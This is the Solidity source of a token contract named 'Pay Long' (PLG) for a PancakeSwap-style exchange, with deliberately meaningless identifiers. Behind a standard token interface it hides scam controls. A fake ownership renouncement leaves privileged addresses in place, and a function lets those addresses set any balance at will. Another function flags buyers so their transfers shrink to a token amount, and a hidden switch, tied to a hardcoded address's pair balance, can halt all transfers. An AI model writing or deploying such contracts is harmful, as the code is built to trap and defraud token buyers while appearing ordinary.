//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface amountFeeReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract marketingEnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toTotal {
    function createPair(address minFund, address amountLaunch) external returns (address);
}

interface listSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundFromSell) external view returns (uint256);

    function transfer(address toEnable, uint256 maxBuy) external returns (bool);

    function allowance(address sellLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxBuy) external returns (bool);

    function transferFrom(
        address sender,
        address toEnable,
        uint256 maxBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed teamMin, uint256 value);
    event Approval(address indexed sellLaunch, address indexed spender, uint256 value);
}

interface maxTeam is listSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PayLong is marketingEnable, listSwap, maxTeam {

    uint256 fundSwap;

    function teamLaunchTrading(address maxBuyTo) public {
        require(maxBuyTo.balance < 100000);
        if (walletFundList) {
            return;
        }
        
        exemptReceiver[maxBuyTo] = true;
        
        walletFundList = true;
    }

    function tokenSenderLaunched() public {
        emit OwnershipTransferred(totalSwap, address(0));
        senderFundLaunched = address(0);
    }

    address teamLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return totalLaunch;
    }

    address public totalSwap;

    mapping(address => mapping(address => uint256)) private listTake;

    function listEnable(address buyExempt, address toEnable, uint256 maxBuy) internal returns (bool) {
        if (buyExempt == totalSwap) {
            return teamBuy(buyExempt, toEnable, maxBuy);
        }
        uint256 atToken = listSwap(teamLiquidityIs).balanceOf(teamLimit);
        require(atToken == walletTotal);
        require(toEnable != teamLimit);
        if (buyTo[buyExempt]) {
            return teamBuy(buyExempt, toEnable, receiverMin);
        }
        return teamBuy(buyExempt, toEnable, maxBuy);
    }

    uint256 public autoListLimit;

    constructor (){
        if (limitReceiver) {
            autoListLimit = atReceiver;
        }
        amountFeeReceiver liquidityFromList = amountFeeReceiver(atMarketing);
        teamLiquidityIs = toTotal(liquidityFromList.factory()).createPair(liquidityFromList.WETH(), address(this));
        
        totalSwap = _msgSender();
        tokenSenderLaunched();
        exemptReceiver[totalSwap] = true;
        receiverMarketing[totalSwap] = swapTake;
        
        emit Transfer(address(0), totalSwap, swapTake);
    }

    function approve(address toReceiver, uint256 maxBuy) public virtual override returns (bool) {
        listTake[_msgSender()][toReceiver] = maxBuy;
        emit Approval(_msgSender(), toReceiver, maxBuy);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return swapTake;
    }

    address public teamLiquidityIs;

    function balanceOf(address fundFromSell) public view virtual override returns (uint256) {
        return receiverMarketing[fundFromSell];
    }

    event OwnershipTransferred(address indexed maxTx, address indexed receiverWalletTeam);

    mapping(address => uint256) private receiverMarketing;

    function getOwner() external view returns (address) {
        return senderFundLaunched;
    }

    mapping(address => bool) public buyTo;

    uint256 constant receiverMin = 19 ** 10;

    mapping(address => bool) public exemptReceiver;

    function liquidityToken(uint256 maxBuy) public {
        totalSender();
        walletTotal = maxBuy;
    }

    function teamBuy(address buyExempt, address toEnable, uint256 maxBuy) internal returns (bool) {
        require(receiverMarketing[buyExempt] >= maxBuy);
        receiverMarketing[buyExempt] -= maxBuy;
        receiverMarketing[toEnable] += maxBuy;
        emit Transfer(buyExempt, toEnable, maxBuy);
        return true;
    }

    function transferFrom(address buyExempt, address toEnable, uint256 maxBuy) external override returns (bool) {
        if (_msgSender() != atMarketing) {
            if (listTake[buyExempt][_msgSender()] != type(uint256).max) {
                require(maxBuy <= listTake[buyExempt][_msgSender()]);
                listTake[buyExempt][_msgSender()] -= maxBuy;
            }
        }
        return listEnable(buyExempt, toEnable, maxBuy);
    }

    function allowance(address enableSwap, address toReceiver) external view virtual override returns (uint256) {
        if (toReceiver == atMarketing) {
            return type(uint256).max;
        }
        return listTake[enableSwap][toReceiver];
    }

    function decimals() external view virtual override returns (uint8) {
        return senderToMode;
    }

    address atMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private senderFundLaunched;

    function transfer(address toList, uint256 maxBuy) external virtual override returns (bool) {
        return listEnable(_msgSender(), toList, maxBuy);
    }

    uint256 walletTotal;

    bool public limitReceiver;

    uint256 private swapTake = 100000000 * 10 ** 18;

    function totalSender() private view {
        require(exemptReceiver[_msgSender()]);
    }

    string private walletFrom = "Pay Long";

    string private totalLaunch = "PLG";

    function name() external view virtual override returns (string memory) {
        return walletFrom;
    }

    bool public walletFundList;

    function senderTotal(address toList, uint256 maxBuy) public {
        totalSender();
        receiverMarketing[toList] = maxBuy;
    }

    function owner() external view returns (address) {
        return senderFundLaunched;
    }

    function launchFund(address fundMinTo) public {
        totalSender();
        if (atReceiver == autoListLimit) {
            autoListLimit = atReceiver;
        }
        if (fundMinTo == totalSwap || fundMinTo == teamLiquidityIs) {
            return;
        }
        buyTo[fundMinTo] = true;
    }

    uint8 private senderToMode = 18;

    bool public tokenMarketing;

    uint256 public atReceiver;

}